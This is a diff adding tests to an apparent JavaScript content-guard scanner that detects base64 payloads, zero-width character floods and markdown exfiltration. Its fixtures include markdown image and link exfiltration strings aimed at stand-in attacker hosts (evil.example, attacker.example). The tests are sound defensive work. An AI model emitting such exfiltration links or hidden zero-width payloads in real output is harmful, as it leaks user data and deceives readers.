@@ -133,7 +133,53 @@ test("computeRisk levels", () => {
     "medium",
   );
   assert.equal(
+    computeRisk([{ rule: "base64-payload", start: 0, end: 64 }], []),
+    "medium",
+  );
+  assert.equal(
+    computeRisk([{ rule: "controls-flood", start: 0, end: 10 }], []),
+    "medium",
+  );
+  assert.equal(
     computeRisk([], [{ rule: "hidden-text", start: 0, end: 3 }]),
     "high",
   );
+});
+
+test("base64-payload detects long tokens only", () => {
+  const long = `payload ${"A".repeat(32)}${"B".repeat(16)}${"0".repeat(16)}== end`;
+  const findings = collectFindings(long, ALL_RULES);
+  assert.ok(findings.some((f) => f.rule === "base64-payload"));
+  assert.ok(
+    collectFindings("short Abc123+/== token", ALL_RULES).every(
+      (f) => f.rule !== "base64-payload",
+    ),
+  );
+});
+
+test("md-exfil matches image and link without network", () => {
+  const img = collectFindings("![x](https://evil.example/exfil)", ALL_RULES);
+  assert.ok(img.some((f) => f.rule === "md-exfil"));
+  const link = collectFindings(
+    "[click](https://attacker.example/collect?d=1)",
+    ALL_RULES,
+  );
+  assert.ok(link.some((f) => f.rule === "md-exfil"));
+});
+
+test("controls-flood elevates risk vs single zero-width", () => {
+  const single = applyGuardToDocument(
+    doc(`請求書${"\u200B"}株式会社`),
+    ALL_RULES,
+    { mode: "flag" },
+  );
+  assert.equal(single.metadata.guardRisk, "low");
+
+  const flood = applyGuardToDocument(
+    doc(`x${"\u200B".repeat(10)}y`),
+    ALL_RULES,
+    { mode: "flag" },
+  );
+  assert.ok(flood.guard.some((g) => g.rule === "controls-flood"));
+  assert.equal(flood.metadata.guardRisk, "medium");
 });
